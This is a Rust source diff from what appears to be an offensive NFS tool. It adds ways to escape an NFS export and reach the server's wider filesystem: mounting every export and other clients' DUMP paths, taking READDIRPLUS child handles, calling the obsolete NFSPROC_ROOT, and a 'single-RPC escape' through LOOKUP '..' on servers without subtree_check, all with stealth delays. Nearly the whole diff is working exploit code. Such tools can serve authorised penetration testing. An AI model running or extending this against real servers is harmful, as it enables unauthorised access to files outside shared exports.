@@ -66,8 +66,9 @@ pub(crate) struct EscapeArgs {
     #[arg(long, default_value_t = DEFAULT_MAX_ROOT_SCAN, value_name = "N", help_heading = H_BEHAVIOR)]
     pub max_root_scan: u32,
 
-    /// Try ALL handle sources (MOUNT v3, MOUNT v1, NFSv4 LOOKUP) and
-    /// report every working root handle instead of stopping at the first.
+    /// Try ALL handle sources (MOUNT v3/v1, NFSv4 LOOKUP, READDIRPLUS
+    /// children, all EXPORT paths, DUMP paths, LOOKUP "..", NFSPROC_ROOT)
+    /// and report every working root handle instead of stopping at the first.
     #[arg(long, help_heading = H_BEHAVIOR)]
     pub all: bool,
 }
@@ -188,6 +189,7 @@ async fn run_inner(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: 
 }
 
 /// A seed handle with its source label (used by `--all` mode).
+#[derive(Clone)]
 struct EscapeSeed {
     handle: FileHandle,
     source: String,
@@ -299,6 +301,9 @@ async fn run_all(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u3
     let mount = make_mount_client(globals);
     let stealth = StealthConfig::new(globals.delay, globals.jitter);
 
+    let direct_port = globals.nfs_port.unwrap_or(2049);
+    let (_, _, v3_probe_client) = make_client_with_hostname(addr, export, 0, 0, &[], stealth.clone(), globals.proxy.as_deref(), Some(direct_port), &globals.hostname);
+
     // --- Collect seed handles from all available sources ---
 
     let mut seeds: Vec<EscapeSeed> = Vec::new();
@@ -357,6 +362,119 @@ async fn run_all(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u3
         }
     }
 
+    // Source 5: READDIRPLUS children of MOUNT v3 handle.
+    // Child entries have fileid_type=1 (INO32_GEN) instead of the export root's
+    // fileid_type=0, carrying real inode data that makes better escape seeds.
+    if let Some(mount_seed) = seeds.first() {
+        stealth.wait().await;
+        if let Ok(page) = v3_probe_client.list_dir_page(&mount_seed.handle, 0, nfs_v3::wire::cookieverf3::default()).await {
+            let mut child_count = 0u32;
+            for entry in &page.entries {
+                if child_count >= 5 {
+                    break;
+                }
+                if entry.name == "." || entry.name == ".." {
+                    continue;
+                }
+                if let Some(ref child_fh) = entry.handle {
+                    let label = format!("READDIRPLUS child '{}' ({} bytes)", entry.name, child_fh.len());
+                    eprintln!("{}", crate::output::status_info(&format!("  {label}: {}", child_fh.to_hex())));
+                    if seen_seed_bytes.insert(child_fh.as_bytes().to_vec()) {
+                        seeds.push(EscapeSeed { handle: child_fh.clone(), source: label });
+                    }
+                    child_count += 1;
+                }
+            }
+        }
+    }
+
+    // Source 6: MNT every export from EXPORT list.
+    // Different exports may reside on different filesystems (different UUIDs)
+    // or have different squash settings (different export_ino).
+    stealth.wait().await;
+    if let Ok(exports) = mount.list_exports(addr).await {
+        let mut mnt_count = 0u32;
+        for exp in &exports {
+            if mnt_count >= 10 || exp.path == export {
+                continue;
+            }
+            stealth.wait().await;
+            if let Ok(mnt) = mount.mount(addr, &exp.path).await {
+                let label = format!("MNT export '{}' ({} bytes)", exp.path, mnt.handle.len());
+                eprintln!("{}", crate::output::status_info(&format!("  {label}: {}", mnt.handle.to_hex())));
+                if seen_seed_bytes.insert(mnt.handle.as_bytes().to_vec()) {
+                    seeds.push(EscapeSeed { handle: mnt.handle.clone(), source: label });
+                }
+                mnt_count += 1;
+                drop(mount.unmount(addr, &exp.path).await);
+            }
+        }
+    }
+
+    // Source 7: MOUNT DUMP paths -- other clients' mount points may reveal
+    // paths not in EXPORT (bind-mount children, dynamically added exports,
+    // sub-directory mounts with different squash settings).
+    stealth.wait().await;
+    if let Ok(clients) = mount.dump_clients(addr).await {
+        let mut dump_count = 0u32;
+        // Snapshot seed source labels to avoid borrowing `seeds` across the push.
+        let known_sources: HashSet<String> = seeds.iter().map(|s| s.source.clone()).collect();
+        for client_entry in &clients {
+            if dump_count >= 10 || client_entry.directory == export {
+                continue;
+            }
+            // Skip paths we already MOUNTed via Source 6.
+            let source_tag = format!("MNT export '{}' (", client_entry.directory);
+            if known_sources.iter().any(|s| s.starts_with(&source_tag)) {
+                continue;
+            }
+            stealth.wait().await;
+            if let Ok(mnt) = mount.mount(addr, &client_entry.directory).await {
+                let label = format!("DUMP path '{}' ({} bytes)", client_entry.directory, mnt.handle.len());
+                eprintln!("{}", crate::output::status_info(&format!("  {label}: {}", mnt.handle.to_hex())));
+                if seen_seed_bytes.insert(mnt.handle.as_bytes().to_vec()) {
+                    seeds.push(EscapeSeed { handle: mnt.handle.clone(), source: label });
+                }
+                dump_count += 1;
+                drop(mount.unmount(addr, &client_entry.directory).await);
+            }
+        }
+    }
+
+    // Source 8: LOOKUP ".." from MOUNT v3 handle.
+    // Without subtree_check (the default), the server returns the parent
+    // directory handle -- which is OUTSIDE the export boundary. This is
+    // essentially a one-step escape.
+    if let Some(mount_seed) = seeds.first().cloned() {
+        stealth.wait().await;
+        if let Ok((parent_fh, _)) = v3_probe_client.resolve(&mount_seed.handle, "..").await
+            && parent_fh.as_bytes() != mount_seed.handle.as_bytes()
+        {
+            let label = format!("LOOKUP '..' parent ({} bytes)", parent_fh.len());
+            eprintln!("{}", crate::output::status_info(&format!("  {label}: {}", parent_fh.to_hex())));
+            if seen_seed_bytes.insert(parent_fh.as_bytes().to_vec()) {
+                seeds.push(EscapeSeed { handle: parent_fh, source: label });
+            }
+        }
+    }
+
+    // Source 9: NFSPROC_ROOT (v2, proc 3) -- obsolete procedure that was
+    // supposed to return the server's root filesystem handle (RFC 1094
+    // S2.2.4). Most modern servers return void, but old or embedded servers
+    // (VxWorks, old Solaris, kernel 2.4.x) may respond with a real handle.
+    {
+        let (_, _, v2_root_client) = make_v2_client_with_hostname(addr, export, 0, 0, &[], stealth.clone(), globals.proxy.as_deref(), Some(direct_port), &globals.hostname);
+        stealth.wait().await;
+        if let Ok(Some(root_fh)) = v2_root_client.root().await {
+            let fh = FileHandle::from_bytes(&root_fh.0);
+            let label = format!("NFSPROC_ROOT v2 ({} bytes)", fh.len());
+            eprintln!("{}", crate::output::status_info(&format!("  {label}: {}", fh.to_hex())));
+            if seen_seed_bytes.insert(fh.as_bytes().to_vec()) {
+                seeds.push(EscapeSeed { handle: fh, source: label });
+            }
+        }
+    }
+
     if seeds.is_empty() {
         eprintln!("{}", crate::output::status_err("No seed handles acquired from any source -- export may not exist or server is unreachable"));
         return Ok(());
@@ -364,10 +482,8 @@ async fn run_all(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u3
 
     eprintln!("{}", crate::output::status_info(&format!("{} unique seed handle(s) acquired", seeds.len())));
 
-    // --- Build probe clients ---
+    // --- Build probe ---
 
-    let direct_port = globals.nfs_port.unwrap_or(2049);
-    let (_, _, v3_probe_client) = make_client_with_hostname(addr, export, 0, 0, &[], stealth.clone(), globals.proxy.as_deref(), Some(direct_port), &globals.hostname);
     let v3_probe = Nfs3EscapeProbe { client: &v3_probe_client };
     let config = EscapeConfig { btrfs_subvols, max_root_scan, announce: true };
 
@@ -635,7 +751,15 @@ pub(crate) async fn find_escape_any(host: &str, export: &str, btrfs_subvols: u32
         return Ok(outcome);
     }
     let outcome = match find_escape(host, export, btrfs_subvols, max_root_scan, globals, announce).await {
-        Ok((_client, o)) => o,
+        Ok((client, o)) => match o {
+            EscapeOutcome::Success { .. } => o,
+            _ => {
+                // LOOKUP ".." from the MOUNT root: without subtree_check (the
+                // default), the server returns the parent handle outside the
+                // export boundary -- a single-RPC escape.
+                if let Some(hit) = try_dotdot_escape(&client, host, export, btrfs_subvols, max_root_scan, globals, announce).await { hit } else { o }
+            },
+        },
         Err(_) => {
             // Handle matrix: try v1+v3 handles with all length variants.
             if let Some((_client, o)) = find_escape_matrix(host, export, btrfs_subvols, max_root_scan, globals, announce).await {
@@ -1341,6 +1465,35 @@ async fn find_escape_v2(host: &str, export: &str, max_root_scan: u32, globals: &
         EscapeRootOutcome::Success(candidate) => Ok(EscapeOutcome::Success { candidate, note: "verified (NFSv2)".to_owned() }),
         EscapeRootOutcome::StaleNoRoot => Ok(EscapeOutcome::StaleNoRoot),
         EscapeRootOutcome::Unsupported => Ok(EscapeOutcome::Unsupported),
+    }
+}
+
+/// LOOKUP ".." escape for single-shot mode: MOUNT the export, resolve "..",
+/// and if the parent handle differs (subtree_check off), use it as a seed
+/// for the escape engine. A single-RPC escape on default-configured servers.
+async fn try_dotdot_escape(client: &Nfs3Client, host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u32, globals: &GlobalOpts, announce: bool) -> Option<EscapeOutcome> {
+    let addr = parse_addr_with_port(host, globals.nfs_port).ok()?;
+    let mount = make_mount_client(globals);
+    let mnt = mount.mount(addr, export).await.ok()?;
+
+    let stealth = StealthConfig::new(globals.delay, globals.jitter);
+    stealth.wait().await;
+    let (parent_fh, _) = client.resolve(&mnt.handle, "..").await.ok()?;
+
+    if parent_fh.as_bytes() == mnt.handle.as_bytes() {
+        return None;
+    }
+
+    if announce {
+        eprintln!("{}", crate::output::status_info(&format!("LOOKUP '..' returned parent handle outside export -- using as escape seed ({})", parent_fh.to_hex())));
+    }
+
+    let probe = Nfs3EscapeProbe { client };
+    let config = EscapeConfig { btrfs_subvols, max_root_scan, announce };
+
+    match find_escape_root(&probe, parent_fh.as_bytes(), &config).await {
+        EscapeRootOutcome::Success(candidate) => Some(EscapeOutcome::Success { candidate, note: "verified (LOOKUP '..' seed)".to_owned() }),
+        _ => None,
     }
 }
 
